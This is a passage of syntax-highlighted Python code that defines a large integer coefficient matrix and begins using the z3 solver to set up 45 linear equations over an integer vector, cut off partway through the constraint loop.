class="number">555</span>, <span class="number">648</span>, -<span class="number">5</span>, -<span class="number">539</span>, -<span class="number">587</span>, -<span class="number">115</span>, -<span class="number">641</span>, <span class="number">639</span>, <span class="number">571</span>, <span class="number">843</span>, -<span class="number">304</span>, <span class="number">501</span>, <span class="number">868</span>, <span class="number">795</span>, -<span class="number">193</span>, -<span class="number">224011</span>],</span><br><span class="line">[<span class="number">766</span>, <span class="number">781</span>, -<span class="number">561</span>, -<span class="number">776</span>, <span class="number">962</span>, -<span class="number">659</span>, <span class="number">804</span>, <span class="number">490</span>, -<span class="number">408</span>, <span class="number">671</span>, -<span class="number">348</span>, -<span class="number">65</span>, -<span class="number">214</span>, -<span class="number">993</span>, <span class="number">392</span>, <span class="number">964</span>, -<span class="number">547</span>, <span class="number">242</span>, <span class="number">479</span>, -<span class="number">165</span>, -<span class="number">54</span>, -<span class="number">55</span>, <span class="number">323</span>, -</span><br><span class="line">    <span class="number">60</span>, -<span class="number">789</span>, -<span class="number">99</span>, -<span class="number">303</span>, <span class="number">590</span>, -<span class="number">552</span>, -<span class="number">861</span>, <span class="number">641</span>, <span class="number">288</span>, -<span class="number">737</span>, -<span class="number">538</span>, <span class="number">868</span>, <span class="number">521</span>, <span class="number">328</span>, -<span class="number">519</span>, -<span class="number">329</span>, <span class="number">31</span>, <span class="number">535</span>, -<span class="number">856</span>, <span class="number">331</span>, -<span class="number">395</span>, -<span class="number">347</span>, -<span class="number">16181</span>],</span><br><span class="line">[<span class="number">769</span>, -<span class="number">981</span>, -<span class="number">650</span>, -<span class="number">516</span>, <span class="number">573</span>, <span class="number">208</span>, <span class="number">478</span>, <span class="number">522</span>, <span class="number">707</span>, <span class="number">574</span>, -<span class="number">418</span>, -<span class="number">899</span>, -<span class="number">218</span>, -<span class="number">597</span>, -<span class="number">573</span>, -<span class="number">936</span>, -<span class="number">95</span>, -<span class="number">497</span>, <span class="number">221</span>, -<span class="number">94</span>, <span class="number">208</span>, <span class="number">602</span>, -<span class="number">599</span>, -</span><br><span class="line">    <span class="number">559</span>, <span class="number">881</span>, -<span class="number">743</span>, -<span class="number">85</span>, <span class="number">951</span>, -<span class="number">303</span>, -<span class="number">733</span>, -<span class="number">1000</span>, <span class="number">846</span>, -<span class="number">945</span>, <span class="number">570</span>, -<span class="number">530</span>, <span class="number">818</span>, -<span class="number">500</span>, <span class="number">650</span>, -<span class="number">514</span>, <span class="number">500</span>, -<span class="number">240</span>, <span class="number">450</span>, <span class="number">849</span>, <span class="number">622</span>, -<span class="number">726</span>, -<span class="number">91699</span>],</span><br><span class="line">[<span class="number">775</span>, -<span class="number">229</span>, <span class="number">661</span>, -<span class="number">772</span>, -<span class="number">806</span>, <span class="number">168</span>, -<span class="number">993</span>, <span class="number">82</span>, -<span class="number">547</span>, -<span class="number">572</span>, -<span class="number">387</span>, -<span class="number">398</span>, -<span class="number">624</span>, <span class="number">703</span>, -<span class="number">848</span>, -<span class="number">606</span>, -<span class="number">725</span>, -<span class="number">316</span>, <span class="number">675</span>, -<span class="number">69</span>, <span class="number">855</span>, -<span class="number">115</span>, -<span class="number">236</span>,</span><br><span class="line">    <span class="number">86</span>, <span class="number">615</span>, <span class="number">423</span>, -<span class="number">806</span>, -<span class="number">834</span>, -<span class="number">236</span>, <span class="number">300</span>, <span class="number">83</span>, -<span class="number">560</span>, <span class="number">623</span>, -<span class="number">816</span>, -<span class="number">449</span>, -<span class="number">830</span>, -<span class="number">474</span>, <span class="number">692</span>, <span class="number">878</span>, <span class="number">146</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">157</span>, -<span class="number">290</span>, -<span class="number">161</span>, -<span class="number">572802</span>],</span><br><span class="line">[<span class="number">959</span>, -<span class="number">549</span>, -<span class="number">704</span>, -<span class="number">833</span>, -<span class="number">783</span>, <span class="number">454</span>, -<span class="number">544</span>, -<span class="number">314</span>, -<span class="number">843</span>, <span class="number">637</span>, -<span class="number">607</span>, <span class="number">916</span>, <span class="number">851</span>, -<span class="number">84</span>, <span class="number">991</span>, <span class="number">329</span>, <span class="number">500</span>, -<span class="number">202</span>, -<span class="number">656</span>, -<span class="number">240</span>, -<span class="number">772</span>, -<span class="number">953</span>, -<span class="number">204</span>,</span><br><span class="line">    <span class="number">312</span>, <span class="number">354</span>, -<span class="number">169</span>, -<span class="number">539</span>, -<span class="number">241</span>, -<span class="number">827</span>, <span class="number">385</span>, -<span class="number">735</span>, <span class="number">459</span>, -<span class="number">756</span>, <span class="number">162</span>, <span class="number">467</span>, -<span class="number">246</span>, -<span class="number">837</span>, -<span class="number">505</span>, -<span class="number">304</span>, <span class="number">879</span>, -<span class="number">149</span>, -<span class="number">251</span>, <span class="number">484</span>, <span class="number">367</span>, <span class="number">331</span>, -<span class="number">440533</span>],</span><br><span class="line">[-<span class="number">22</span>, -<span class="number">708</span>, -<span class="number">43</span>, <span class="number">11</span>, <span class="number">81</span>, <span class="number">47</span>, <span class="number">1000</span>, -<span class="number">534</span>, <span class="number">462</span>, -<span class="number">835</span>, -<span class="number">637</span>, -<span class="number">282</span>, <span class="number">179</span>, -<span class="number">908</span>, <span class="number">839</span>, <span class="number">17</span>, -<span class="number">391</span>, <span class="number">331</span>, -<span class="number">952</span>, <span class="number">122</span>, -<span class="number">405</span>, -<span class="number">33</span>, -<span class="number">151</span>, -</span><br><span class="line">    <span class="number">916</span>, -<span class="number">889</span>, <span class="number">712</span>, <span class="number">243</span>, <span class="number">527</span>, -<span class="number">588</span>, <span class="number">421</span>, -<span class="number">222</span>, <span class="number">427</span>, <span class="number">693</span>, <span class="number">137</span>, <span class="number">460</span>, -<span class="number">604</span>, -<span class="number">757</span>, <span class="number">611</span>, -<span class="number">846</span>, -<span class="number">539</span>, -<span class="number">893</span>, -<span class="number">659</span>, <span class="number">494</span>, -<span class="number">653</span>, <span class="number">235</span>, -<span class="number">442324</span>],</span><br><span class="line">[<span class="number">101</span>, <span class="number">286</span>, <span class="number">257</span>, -<span class="number">858</span>, <span class="number">969</span>, -<span class="number">581</span>, <span class="number">154</span>, <span class="number">64</span>, <span class="number">861</span>, <span class="number">266</span>, <span class="number">543</span>, <span class="number">615</span>, <span class="number">565</span>, -<span class="number">408</span>, -<span class="number">252</span>, -<span class="number">61</span>, <span class="number">267</span>, -<span class="number">36</span>, <span class="number">702</span>, -<span class="number">628</span>, -<span class="number">416</span>, -<span class="number">349</span>, -<span class="number">784</span>, -<span class="number">403</span>,</span><br><span class="line">    <span class="number">100</span>, -<span class="number">965</span>, <span class="number">775</span>, <span class="number">296</span>, <span class="number">388</span>, -<span class="number">485</span>, -<span class="number">198</span>, <span class="number">311</span>, -<span class="number">451</span>, <span class="number">914</span>, -<span class="number">544</span>, <span class="number">297</span>, -<span class="number">758</span>, -<span class="number">616</span>, -<span class="number">96</span>, -<span class="number">119</span>, <span class="number">211</span>, -<span class="number">185</span>, -<span class="number">899</span>, -<span class="number">683</span>, -<span class="number">681</span>, -<span class="number">29239</span>],</span><br><span class="line">[<span class="number">739</span>, <span class="number">78</span>, -<span class="number">359</span>, -<span class="number">917</span>, -<span class="number">264</span>, <span class="number">717</span>, -<span class="number">670</span>, -<span class="number">301</span>, -<span class="number">657</span>, <span class="number">36</span>, -<span class="number">545</span>, -<span class="number">425</span>, -<span class="number">544</span>, <span class="number">969</span>, -<span class="number">659</span>, <span class="number">367</span>, <span class="number">240</span>, -<span class="number">354</span>, <span class="number">720</span>, <span class="number">501</span>, -<span class="number">466</span>, -<span class="number">822</span>, <span class="number">386</span>, -</span><br><span class="line">    <span class="number">787</span>, <span class="number">756</span>, -<span class="number">66</span>, -<span class="number">641</span>, -<span class="number">923</span>, -<span class="number">690</span>, <span class="number">323</span>, <span class="number">533</span>, -<span class="number">963</span>, -<span class="number">505</span>, <span class="number">78</span>, <span class="number">834</span>, -<span class="number">66</span>, -<span class="number">93</span>, <span class="number">36</span>, -<span class="number">121</span>, <span class="number">543</span>, -<span class="number">653</span>, <span class="number">417</span>, -<span class="number">869</span>, <span class="number">100</span>, -<span class="number">771</span>, -<span class="number">585661</span>],</span><br><span class="line">[-<span class="number">393</span>, -<span class="number">446</span>, -<span class="number">661</span>, <span class="number">482</span>, -<span class="number">558</span>, -<span class="number">228</span>, <span class="number">16</span>, <span class="number">960</span>, <span class="number">985</span>, <span class="number">722</span>, <span class="number">945</span>, -<span class="number">654</span>, <span class="number">806</span>, <span class="number">810</span>, <span class="number">526</span>, -<span class="number">436</span>, -<span class="number">231</span>, -<span class="number">428</span>, -<span class="number">219</span>, -<span class="number">326</span>, <span class="number">311</span>, -<span class="number">174</span>, -</span><br><span class="line">    <span class="number">120</span>, -<span class="number">710</span>, <span class="number">220</span>, <span class="number">330</span>, <span class="number">178</span>, -<span class="number">522</span>, <span class="number">921</span>, <span class="number">936</span>, <span class="number">738</span>, -<span class="number">834</span>, <span class="number">252</span>, <span class="number">249</span>, -<span class="number">631</span>, <span class="number">51</span>, -<span class="number">247</span>, -<span class="number">217</span>, -<span class="number">841</span>, <span class="number">2</span>, <span class="number">438</span>, <span class="number">617</span>, <span class="number">499</span>, <span class="number">970</span>, -<span class="number">918</span>, <span class="number">106807</span>],</span><br><span class="line">[<span class="number">547</span>, -<span class="number">383</span>, -<span class="number">612</span>, -<span class="number">998</span>, -<span class="number">251</span>, -<span class="number">387</span>, -<span class="number">912</span>, -<span class="number">661</span>, <span class="number">934</span>, -<span class="number">14</span>, <span class="number">697</span>, <span class="number">833</span>, -<span class="number">4</span>, <span class="number">667</span>, -<span class="number">454</span>, <span class="number">110</span>, -<span class="number">818</span>, <span class="number">549</span>, <span class="number">81</span>, <span class="number">466</span>, <span class="number">737</span>, <span class="number">520</span>, <span class="number">762</span>, -<span class="number">861</span>, -</span><br><span class="line">    <span class="number">936</span>, <span class="number">993</span>, -<span class="number">525</span>, -<span class="number">900</span>, -<span class="number">618</span>, -<span class="number">62</span>, -<span class="number">564</span>, -<span class="number">674</span>, <span class="number">882</span>, -<span class="number">587</span>, -<span class="number">404</span>, -<span class="number">413</span>, <span class="number">376</span>, <span class="number">596</span>, -<span class="number">451</span>, -<span class="number">275</span>, <span class="number">466</span>, -<span class="number">688</span>, <span class="number">940</span>, -<span class="number">565</span>, <span class="number">191</span>, -<span class="number">412046</span>],</span><br><span class="line">[<span class="number">72</span>, -<span class="number">635</span>, <span class="number">549</span>, <span class="number">183</span>, <span class="number">596</span>, <span class="number">785</span>, -<span class="number">189</span>, <span class="number">331</span>, <span class="number">852</span>, <span class="number">427</span>, <span class="number">166</span>, -<span class="number">72</span>, <span class="number">579</span>, <span class="number">191</span>, <span class="number">535</span>, <span class="number">333</span>, -<span class="number">675</span>, <span class="number">560</span>, <span class="number">100</span>, <span class="number">127</span>, <span class="number">979</span>, <span class="number">1000</span>, -<span class="number">917</span>,</span><br><span class="line">    <span class="number">765</span>, <span class="number">793</span>, <span class="number">871</span>, <span class="number">32</span>, <span class="number">738</span>, <span class="number">923</span>, <span class="number">832</span>, -<span class="number">408</span>, <span class="number">225</span>, <span class="number">457</span>, <span class="number">747</span>, <span class="number">799</span>, <span class="number">251</span>, -<span class="number">57</span>, <span class="number">91</span>, -<span class="number">150</span>, <span class="number">343</span>, <span class="number">428</span>, <span class="number">858</span>, -<span class="number">607</span>, <span class="number">686</span>, <span class="number">979</span>, <span class="number">1312536</span>],</span><br><span class="line">[<span class="number">963</span>, <span class="number">304</span>, <span class="number">780</span>, <span class="number">723</span>, <span class="number">152</span>, -<span class="number">34</span>, <span class="number">595</span>, -<span class="number">627</span>, <span class="number">411</span>, -<span class="number">945</span>, <span class="number">229</span>, <span class="number">265</span>, <span class="number">864</span>, <span class="number">821</span>, <span class="number">61</span>, -<span class="number">121</span>, -<span class="number">816</span>, <span class="number">865</span>, -<span class="number">588</span>, -<span class="number">118</span>, -<span class="number">497</span>, -<span class="number">579</span>, -<span class="number">302</span>, -</span><br><span class="line">    <span class="number">348</span>, <span class="number">812</span>, <span class="number">145</span>, <span class="number">86</span>, -<span class="number">689</span>, -<span class="number">134</span>, -<span class="number">615</span>, -<span class="number">348</span>, -<span class="number">744</span>, <span class="number">601</span>, -<span class="number">31</span>, <span class="number">36</span>, <span class="number">193</span>, <span class="number">27</span>, -<span class="number">514</span>, <span class="number">600</span>, -<span class="number">338</span>, <span class="number">644</span>, -<span class="number">936</span>, <span class="number">80</span>, -<span class="number">925</span>, -<span class="number">658</span>, <span class="number">44628</span>],</span><br><span class="line">[<span class="number">656</span>, <span class="number">748</span>, -<span class="number">756</span>, <span class="number">812</span>, <span class="number">815</span>, -<span class="number">935</span>, <span class="number">413</span>, -<span class="number">551</span>, <span class="number">981</span>, <span class="number">838</span>, <span class="number">786</span>, -<span class="number">241</span>, <span class="number">259</span>, <span class="number">873</span>, -<span class="number">436</span>, -<span class="number">734</span>, <span class="number">704</span>, -<span class="number">862</span>, <span class="number">475</span>, -<span class="number">80</span>, -<span class="number">906</span>, -<span class="number">587</span>, -</span><br><span class="line">    <span class="number">202</span>, -<span class="number">4</span>, -<span class="number">776</span>, <span class="number">452</span>, <span class="number">906</span>, <span class="number">510</span>, <span class="number">674</span>, -<span class="number">370</span>, -<span class="number">714</span>, <span class="number">118</span>, <span class="number">99</span>, -<span class="number">889</span>, <span class="number">81</span>, <span class="number">526</span>, -<span class="number">995</span>, <span class="number">496</span>, <span class="number">109</span>, <span class="number">395</span>, <span class="number">38</span>, -<span class="number">19</span>, <span class="number">406</span>, -<span class="number">254</span>, -<span class="number">245</span>, <span class="number">232490</span>],</span><br><span class="line">[<span class="number">16</span>, -<span class="number">750</span>, <span class="number">871</span>, -<span class="number">89</span>, -<span class="number">544</span>, -<span class="number">305</span>, -<span class="number">269</span>, -<span class="number">758</span>, <span class="number">226</span>, -<span class="number">399</span>, -<span class="number">129</span>, -<span class="number">258</span>, <span class="number">465</span>, <span class="number">168</span>, <span class="number">822</span>, -<span class="number">554</span>, <span class="number">193</span>, <span class="number">962</span>, -<span class="number">998</span>, -<span class="number">288</span>, -<span class="number">537</span>, -<span class="number">550</span>, -<span class="number">862</span>, -</span><br><span class="line">    <span class="number">1000</span>, -<span class="number">984</span>, -<span class="number">966</span>, <span class="number">153</span>, -<span class="number">844</span>, -<span class="number">559</span>, -<span class="number">425</span>, -<span class="number">415</span>, <span class="number">194</span>, <span class="number">827</span>, <span class="number">430</span>, <span class="number">491</span>, -<span class="number">430</span>, <span class="number">920</span>, -<span class="number">20</span>, <span class="number">848</span>, -<span class="number">26</span>, -<span class="number">216</span>, -<span class="number">335</span>, -<span class="number">534</span>, -<span class="number">398</span>, <span class="number">951</span>, -<span class="number">383077</span>],</span><br><span class="line">[<span class="number">511</span>, <span class="number">391</span>, <span class="number">944</span>, -<span class="number">920</span>, <span class="number">163</span>, -<span class="number">189</span>, <span class="number">58</span>, <span class="number">116</span>, <span class="number">417</span>, -<span class="number">538</span>, <span class="number">360</span>, -<span class="number">60</span>, -<span class="number">749</span>, <span class="number">537</span>, <span class="number">899</span>, -<span class="number">469</span>, -<span class="number">644</span>, <span class="number">89</span>, -<span class="number">861</span>, <span class="number">619</span>, -<span class="number">833</span>, -<span class="number">61</span>, <span class="number">244</span>, -</span><br><span class="line">    <span class="number">159</span>, <span class="number">393</span>, <span class="number">82</span>, <span class="number">853</span>, -<span class="number">599</span>, <span class="number">51</span>, <span class="number">593</span>, -<span class="number">633</span>, <span class="number">222</span>, <span class="number">997</span>, <span class="number">32</span>, <span class="number">728</span>, -<span class="number">395</span>, <span class="number">952</span>, <span class="number">354</span>, -<span class="number">301</span>, -<span class="number">617</span>, <span class="number">42</span>, <span class="number">310</span>, <span class="number">649</span>, <span class="number">580</span>, <span class="number">823</span>, <span class="number">436266</span>],</span><br><span class="line">[-<span class="number">641</span>, -<span class="number">173</span>, <span class="number">563</span>, <span class="number">813</span>, <span class="number">70</span>, <span class="number">154</span>, <span class="number">704</span>, -<span class="number">476</span>, -<span class="number">971</span>, <span class="number">494</span>, <span class="number">532</span>, -<span class="number">4</span>, <span class="number">247</span>, -<span class="number">559</span>, <span class="number">390</span>, <span class="number">823</span>, -<span class="number">937</span>, -<span class="number">401</span>, <span class="number">592</span>, <span class="number">688</span>, <span class="number">556</span>, <span class="number">363</span>, -<span class="number">921</span>, -<span class="number">609</span>,</span><br><span class="line">    <span class="number">444</span>, -<span class="number">802</span>, -<span class="number">424</span>, -<span class="number">612</span>, <span class="number">495</span>, -<span class="number">573</span>, <span class="number">247</span>, -<span class="number">190</span>, <span class="number">432</span>, <span class="number">504</span>, <span class="number">849</span>, -<span class="number">996</span>, <span class="number">341</span>, <span class="number">800</span>, <span class="number">396</span>, -<span class="number">437</span>, -<span class="number">428</span>, <span class="number">884</span>, -<span class="number">695</span>, -<span class="number">149</span>, <span class="number">154</span>, <span class="number">107084</span>],</span><br><span class="line">[-<span class="number">699</span>, <span class="number">63</span>, <span class="number">42</span>, <span class="number">691</span>, <span class="number">862</span>, <span class="number">373</span>, <span class="number">647</span>, <span class="number">776</span>, -<span class="number">590</span>, <span class="number">817</span>, -<span class="number">455</span>, -<span class="number">107</span>, -<span class="number">882</span>, -<span class="number">992</span>, -<span class="number">483</span>, <span class="number">828</span>, <span class="number">260</span>, <span class="number">254</span>, <span class="number">277</span>, -<span class="number">433</span>, -<span class="number">508</span>, <span class="number">702</span>, <span class="number">997</span>, -<span class="number">287</span>,</span><br><span class="line">    <span class="number">640</span>, -<span class="number">995</span>, -<span class="number">654</span>, -<span class="number">618</span>, -<span class="number">26</span>, <span class="number">474</span>, -<span class="number">979</span>, <span class="number">617</span>, -<span class="number">4</span>, -<span class="number">267</span>, -<span class="number">229</span>, -<span class="number">713</span>, -<span class="number">285</span>, -<span class="number">124</span>, -<span class="number">64</span>, -<span class="number">496</span>, -<span class="number">567</span>, <span class="number">128</span>, -<span class="number">526</span>, <span class="number">516</span>, <span class="number">21</span>, -<span class="number">117467</span>],</span><br><span class="line">[-<span class="number">8</span>, -<span class="number">507</span>, <span class="number">122</span>, <span class="number">708</span>, -<span class="number">86</span>, <span class="number">285</span>, <span class="number">579</span>, -<span class="number">647</span>, <span class="number">435</span>, -<span class="number">150</span>, -<span class="number">1000</span>, -<span class="number">765</span>, -<span class="number">154</span>, <span class="number">938</span>, <span class="number">270</span>, <span class="number">330</span>, <span class="number">350</span>, <span class="number">569</span>, <span class="number">447</span>, -<span class="number">912</span>, <span class="number">712</span>, <span class="number">74</span>, <span class="number">667</span>,</span><br><span class="line">    <span class="number">725</span>, -<span class="number">585</span>, -<span class="number">381</span>, -<span class="number">447</span>, -<span class="number">7</span>, <span class="number">326</span>, -<span class="number">758</span>, <span class="number">123</span>, <span class="number">470</span>, <span class="number">839</span>, <span class="number">379</span>, -<span class="number">809</span>, <span class="number">334</span>, <span class="number">539</span>, -<span class="number">103</span>, -<span class="number">723</span>, <span class="number">651</span>, <span class="number">359</span>, <span class="number">628</span>, -<span class="number">986</span>, <span class="number">150</span>, <span class="number">231</span>, <span class="number">309109</span>],</span><br><span class="line">[<span class="number">398</span>, <span class="number">50</span>, <span class="number">511</span>, -<span class="number">754</span>, -<span class="number">444</span>, <span class="number">457</span>, <span class="number">139</span>, <span class="number">312</span>, -<span class="number">989</span>, <span class="number">639</span>, <span class="number">451</span>, -<span class="number">697</span>, <span class="number">758</span>, -<span class="number">265</span>, <span class="number">653</span>, <span class="number">725</span>, <span class="number">911</span>, <span class="number">528</span>, -<span class="number">975</span>, -<span class="number">138</span>, -<span class="number">766</span>, <span class="number">846</span>, <span class="number">701</span>, -</span><br><span class="line">    <span class="number">558</span>, -<span class="number">825</span>, -<span class="number">523</span>, -<span class="number">54</span>, <span class="number">788</span>, <span class="number">393</span>, <span class="number">568</span>, <span class="number">947</span>, -<span class="number">529</span>, -<span class="number">210</span>, <span class="number">533</span>, -<span class="number">918</span>, -<span class="number">525</span>, -<span class="number">955</span>, -<span class="number">540</span>, <span class="number">713</span>, -<span class="number">154</span>, <span class="number">647</span>, -<span class="number">982</span>, -<span class="number">543</span>, -<span class="number">149</span>, <span class="number">415</span>, <span class="number">71961</span>],</span><br><span class="line">[<span class="number">864</span>, <span class="number">976</span>, <span class="number">635</span>, <span class="number">543</span>, -<span class="number">459</span>, <span class="number">252</span>, -<span class="number">626</span>, -<span class="number">877</span>, -<span class="number">100</span>, -<span class="number">630</span>, -<span class="number">64</span>, <span class="number">183</span>, <span class="number">990</span>, -<span class="number">197</span>, <span class="number">33</span>, <span class="number">207</span>, <span class="number">474</span>, -<span class="number">814</span>, <span class="number">880</span>, -<span class="number">824</span>, -<span class="number">469</span>, <span class="number">605</span>, -<span class="number">652</span>, <span class="number">101</span>,</span><br><span class="line">    <span class="number">268</span>, <span class="number">370</span>, <span class="number">627</span>, -<span class="number">959</span>, -<span class="number">383</span>, <span class="number">306</span>, -<span class="number">628</span>, -<span class="number">349</span>, -<span class="number">250</span>, <span class="number">524</span>, -<span class="number">630</span>, <span class="number">200</span>, <span class="number">979</span>, <span class="number">712</span>, -<span class="number">313</span>, -<span class="number">891</span>, -<span class="number">835</span>, -<span class="number">94</span>, -<span class="number">668</span>, <span class="number">982</span>, -<span class="number">373</span>, <span class="number">21720</span>],</span><br><span class="line">[<span class="number">784</span>, <span class="number">408</span>, -<span class="number">868</span>, -<span class="number">457</span>, <span class="number">433</span>, -<span class="number">231</span>, <span class="number">621</span>, <span class="number">859</span>, -<span class="number">359</span>, -<span class="number">821</span>, -<span class="number">217</span>, -<span class="number">306</span>, <span class="number">675</span>, -<span class="number">33</span>, <span class="number">260</span>, <span class="number">248</span>, -<span class="number">442</span>, <span class="number">179</span>, -<span class="number">469</span>, -<span class="number">794</span>, <span class="number">860</span>, <span class="number">242</span>, -<span class="number">53</span>,</span><br><span class="line">    <span class="number">650</span>, <span class="number">966</span>, -<span class="number">886</span>, <span class="number">254</span>, -<span class="number">546</span>, -<span class="number">130</span>, <span class="number">945</span>, -<span class="number">365</span>, -<span class="number">797</span>, -<span class="number">550</span>, <span class="number">225</span>, <span class="number">233</span>, <span class="number">591</span>, <span class="number">248</span>, -<span class="number">548</span>, <span class="number">185</span>, <span class="number">328</span>, <span class="number">755</span>, -<span class="number">719</span>, -<span class="number">845</span>, <span class="number">550</span>, -<span class="number">811</span>, <span class="number">49050</span>],</span><br><span class="line">[-<span class="number">822</span>, <span class="number">364</span>, <span class="number">723</span>, -<span class="number">221</span>, <span class="number">585</span>, -<span class="number">883</span>, <span class="number">47</span>, -<span class="number">455</span>, <span class="number">565</span>, -<span class="number">156</span>, <span class="number">369</span>, -<span class="number">422</span>, -<span class="number">32</span>, -<span class="number">381</span>, -<span class="number">420</span>, <span class="number">826</span>, <span class="number">84</span>, <span class="number">204</span>, -<span class="number">470</span>, <span class="number">366</span>, -<span class="number">204</span>, <span class="number">570</span>, <span class="number">428</span>,</span><br><span class="line">    <span class="number">195</span>, -<span class="number">759</span>, -<span class="number">69</span>, -<span class="number">250</span>, <span class="number">508</span>, -<span class="number">35</span>, -<span class="number">720</span>, -<span class="number">352</span>, -<span class="number">525</span>, -<span class="number">426</span>, -<span class="number">586</span>, <span class="number">854</span>, -<span class="number">471</span>, <span class="number">900</span>, -<span class="number">529</span>, -<span class="number">917</span>, <span class="number">143</span>, -<span class="number">352</span>, -<span class="number">46</span>, -<span class="number">52</span>, -<span class="number">889</span>, <span class="number">560</span>, -<span class="number">84381</span>],</span><br><span class="line">[<span class="number">269</span>, <span class="number">355</span>, <span class="number">333</span>, <span class="number">64</span>, <span class="number">753</span>, <span class="number">420</span>, <span class="number">91</span>, -<span class="number">566</span>, -<span class="number">795</span>, -<span class="number">134</span>, -<span class="number">165</span>, <span class="number">449</span>, -<span class="number">79</span>, <span class="number">939</span>, -<span class="number">539</span>, -<span class="number">457</span>, -<span class="number">781</span>, -<span class="number">198</span>, -<span class="number">905</span>, <span class="number">467</span>, -<span class="number">524</span>, <span class="number">455</span>, -<span class="number">628</span>, -</span><br><span class="line">    <span class="number">562</span>, -<span class="number">345</span>, -<span class="number">872</span>, <span class="number">217</span>, <span class="number">808</span>, <span class="number">341</span>, -<span class="number">801</span>, <span class="number">128</span>, -<span class="number">797</span>, -<span class="number">736</span>, <span class="number">592</span>, -<span class="number">43</span>, <span class="number">197</span>, -<span class="number">657</span>, -<span class="number">316</span>, -<span class="number">809</span>, -<span class="number">548</span>, -<span class="number">797</span>, -<span class="number">280</span>, <span class="number">733</span>, <span class="number">388</span>, <span class="number">219</span>, -<span class="number">302598</span>],</span><br><span class="line">[-<span class="number">295</span>, <span class="number">180</span>, <span class="number">330</span>, <span class="number">37</span>, -<span class="number">176</span>, -<span class="number">387</span>, -<span class="number">833</span>, <span class="number">611</span>, -<span class="number">663</span>, -<span class="number">131</span>, <span class="number">513</span>, <span class="number">733</span>, <span class="number">994</span>, -<span class="number">673</span>, -<span class="number">647</span>, -<span class="number">935</span>, -<span class="number">65</span>, -<span class="number">811</span>, <span class="number">211</span>, -<span class="number">331</span>, -<span class="number">899</span>, -<span class="number">741</span>, -<span class="number">206</span>,</span><br><span class="line">    <span class="number">37</span>, -<span class="number">863</span>, <span class="number">227</span>, <span class="number">162</span>, -<span class="number">374</span>, <span class="number">801</span>, <span class="number">448</span>, <span class="number">370</span>, <span class="number">887</span>, -<span class="number">136</span>, -<span class="number">775</span>, <span class="number">636</span>, <span class="number">794</span>, <span class="number">526</span>, <span class="number">590</span>, <span class="number">991</span>, <span class="number">880</span>, -<span class="number">687</span>, -<span class="number">416</span>, <span class="number">436</span>, -<span class="number">234</span>, -<span class="number">508</span>, -<span class="number">52964</span>],</span><br><span class="line">[-<span class="number">962</span>, <span class="number">600</span>, <span class="number">191</span>, -<span class="number">32</span>, <span class="number">859</span>, -<span class="number">106</span>, <span class="number">544</span>, <span class="number">698</span>, -<span class="number">198</span>, <span class="number">170</span>, <span class="number">898</span>, <span class="number">591</span>, -<span class="number">239</span>, -<span class="number">125</span>, -<span class="number">465</span>, -<span class="number">80</span>, <span class="number">545</span>, -<span class="number">292</span>, -<span class="number">14</span>, -<span class="number">775</span>, -<span class="number">841</span>, <span class="number">775</span>, <span class="number">553</span>,</span><br><span class="line">    <span class="number">720</span>, -<span class="number">411</span>, -<span class="number">753</span>, <span class="number">347</span>, <span class="number">197</span>, -<span class="number">922</span>, -<span class="number">481</span>, -<span class="number">183</span>, -<span class="number">564</span>, <span class="number">913</span>, -<span class="number">142</span>, -<span class="number">220</span>, -<span class="number">889</span>, -<span class="number">302</span>, <span class="number">567</span>, <span class="number">954</span>, <span class="number">193</span>, -<span class="number">853</span>, <span class="number">637</span>, -<span class="number">13</span>, -<span class="number">143</span>, <span class="number">356</span>, <span class="number">209341</span>],</span><br><span class="line">[<span class="number">907</span>, -<span class="number">6</span>, -<span class="number">108</span>, <span class="number">586</span>, -<span class="number">286</span>, -<span class="number">420</span>, -<span class="number">397</span>, <span class="number">545</span>, -<span class="number">942</span>, <span class="number">378</span>, -<span class="number">781</span>, <span class="number">173</span>, -<span class="number">749</span>, -<span class="number">926</span>, -<span class="number">201</span>, <span class="number">915</span>, <span class="number">75</span>, -<span class="number">51</span>, -<span class="number">361</span>, <span class="number">511</span>, <span class="number">441</span>, -<span class="number">106</span>, -<span class="number">823</span>,</span><br><span class="line">    <span class="number">271</span>, <span class="number">540</span>, -<span class="number">42</span>, <span class="number">400</span>, <span class="number">860</span>, <span class="number">506</span>, -<span class="number">632</span>, <span class="number">750</span>, <span class="number">575</span>, -<span class="number">434</span>, <span class="number">64</span>, -<span class="number">471</span>, <span class="number">133</span>, -<span class="number">299</span>, -<span class="number">269</span>, <span class="number">810</span>, -<span class="number">55</span>, -<span class="number">200</span>, -<span class="number">671</span>, <span class="number">837</span>, -<span class="number">97</span>, <span class="number">314</span>, <span class="number">102350</span>]]</span><br><span class="line"></span><br><span class="line">x = IntVector(<span class="string">&#x27;x&#x27;</span>, <span class="number">45</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    s.add(x[<span class="number">0</span>] * number[i][<span class="number">0</span>] +</span><br><span class="line">          x[<span class="number">1</span>] * number[i][<span class="number">1</span>] +</span><br><span class="line">          x[<span class="number">2</span>] * number[i][<span class="number">2</span>] +</span><br><span class="line">          x[<span class="number">3</span>] * number[i][<span class="number">3</span>] +</span><br><span class="line">          x[<span class="number">4</span>] * number[i][<span class="number">4</span>] +</span><br><span class="line">          x[<span class="number">5</span>] * number[i][<span class="number">5</span>] +</span><br><span class="line">          x[<span class="number">6</span>] * number[i][<span class="number">6</span>] +</span><br><span class="line">          x[<span class="number">7</span>] * number[i][<span class="number">7</span>] +</span><br><span class="line">          x[<span class="number">8</span>] * number[i][<span class="number">8</span>] +</span><br><span class="line">          x[<span class="number">9</span>] * number[i][<span class="number">9</span>] +</span><br><span class="line">          x[<span class="number">10</span>] * number[i][<span class="number">10</span>] +</span><br><span class="line">          x[<span class="number">11</span>] * number[i][<span class="number">11</span>] +</span><br><span class="line">          x[<span class="number">12</span>] * number[i][<span class="number">12</span>] +</span><br><span class="line">          x[<span class="number">13</span>] * number[i][<span class="number">13</span>] +</span><br><span class="line">          x[<span class="number">14</span>] * number[i][<span class="number">14</span>] +</span><br><span class="line">          x[<span class="number">15</span>] * number[i][<span class="number">15</span>] +</span><br><span class="line">          x[<span class="number">16</span>] * number[i][<span class="number">16</span>] +</span><br><span class="line">          x[<span class="number">17</span>] * number[i][<span class="number">17</span>] +</span><br><span class="line">          x[<span class="number">18</span>] * number[i][<span class="number">18</span>] +</span><br><span class="line">          x[<span class="number">19</span>] * number[i][<span class="number">19</span>] +</span><br><span class="line">          x[<span 